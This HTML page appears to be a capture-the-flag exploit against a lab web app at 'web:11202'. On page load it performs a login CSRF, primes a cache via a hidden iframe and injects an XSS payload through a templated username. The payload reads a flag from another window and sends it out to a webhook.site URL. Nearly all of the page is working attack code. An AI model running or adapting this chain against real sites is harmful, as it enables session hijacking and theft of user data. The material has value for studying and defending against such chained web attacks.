<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
</head>
<body>
    <h1>Exploiting...</h1>
    <div id="log"></div>
    <script>
        const WEB_URL = "http://web:11202";
        
        // Using Webhook.site to receive the flag
        const EXPLOIT_SERVER = "https://webhook.site/8e7ccc1c-b998-40ff-bc7f-14c432def363";

        const XSS_PAYLOAD = `
            <script>
                try {
                    const flagWin = window.open('', 'flagWin');
                    if (flagWin) {
                         // Wait a bit for the DOM to be ready? 
                         setTimeout(() => {
                            try {
                                const code = flagWin.document.querySelector('code');
                                if (code) {
                                    const flag = code.innerText;
                                    window.location = '${EXPLOIT_SERVER}?flag=' + encodeURIComponent(flag);
                                } else {
                                    window.location = '${EXPLOIT_SERVER}?error=no_code_element&html=' + encodeURIComponent(flagWin.document.body.innerHTML.substring(0, 200));
                                }
                            } catch(e) {
                                window.location = '${EXPLOIT_SERVER}?error=inner_' + encodeURIComponent(e.toString());
                            }
                         }, 500);
                    } else {
                        window.location = '${EXPLOIT_SERVER}?error=no_flag_window';
                    }
                } catch(e) {
                    window.location = '${EXPLOIT_SERVER}?error=' + encodeURIComponent(e.toString());
                }
            <\/script>
        `;
        
        const log = (msg) => {
            document.getElementById('log').innerText += msg + '\n';
            // Use Image for logging as it's often less restricted (though img-src 'self' is set, 
            // but we are on exploit domain so img src to self is fine? No, we are injecting into web:11202)
            // For the exploit page logs:
            fetch('/log?msg=' + encodeURIComponent(msg)).catch(() => {});
        };

        async function run() {
            log('Starting fast exploit...');

            // Step 1: Open Flag Window
            log('1. Opening flag window...');
            const flagWin = window.open(WEB_URL + '/flag', 'flagWin');
            
            // Step 2: Prime Cache for /
            log('2. Priming cache...');
            const cacheFrame = document.createElement('iframe');
            cacheFrame.src = WEB_URL + '/';
            cacheFrame.style.display = 'none';
            document.body.appendChild(cacheFrame);
            
            await new Promise((resolve) => {
                cacheFrame.onload = resolve;
                setTimeout(resolve, 2000); // Wait longer to ensure cache is primed
            });
            log('Cache primed (via iframe).');

            // Step 3: Login CSRF
            log('3. Performing Login CSRF...');
            
            const loginFrame = document.createElement('iframe');
            loginFrame.name = 'loginFrame';
            loginFrame.style.display = 'none'; 
            document.body.appendChild(loginFrame);
            
            // We need to wait for the login to complete.
            // The form targets loginFrame.
            // When it submits, it redirects to /.
            
            let loadCount = 0;
            loginFrame.onload = () => {
                loadCount++;
                log('Login frame loaded: ' + loadCount);
                
                // loadCount 1: about:blank (initial) -> sometimes
                // loadCount 1 (or 2): Result of POST (redirect to /)
                
                // We'll assume the first load after submit is the one.
                // But to be safe, let's wait a tiny bit after submit before checking?
                // Or just trigger on load.
                
                if (loadCount > 0) { // Trigger on first load
                     log('4. Triggering XSS...');
                     // We inject the payload into the 'x' parameter.
                     // The username was registered as "{request.query_params[x]}"
                     // So when the flash message renders: "Welcome back, {request.query_params[x]}!"
                     // It becomes "Welcome back, [PAYLOAD]!"
                     const targetUrl = WEB_URL + '/?x=' + encodeURIComponent(XSS_PAYLOAD);
                     
                     // IMPORTANT: We must navigate the SAME frame to keep the session
                     loginFrame.src = targetUrl;
                }
            };
            
            const form = document.createElement('form');
            form.action = WEB_URL + '/login';
            form.method = 'POST';
            form.target = 'loginFrame';
            
            const u = document.createElement('input');
            u.type = 'hidden';
            u.name = 'username';
            u.value = '{request.query_params[x]}'; 
            form.appendChild(u);
            
            const p = document.createElement('input');
            p.type = 'hidden';
            p.name = 'password';
            p.value = 'password123';
            form.appendChild(p);
            
            document.body.appendChild(form);
            
            // Delay slightly to ensure onload is attached properly
            setTimeout(() => {
                form.submit();
            }, 100);
        }
        
        // Start immediately
        run();
    </script>
</body>
</html>
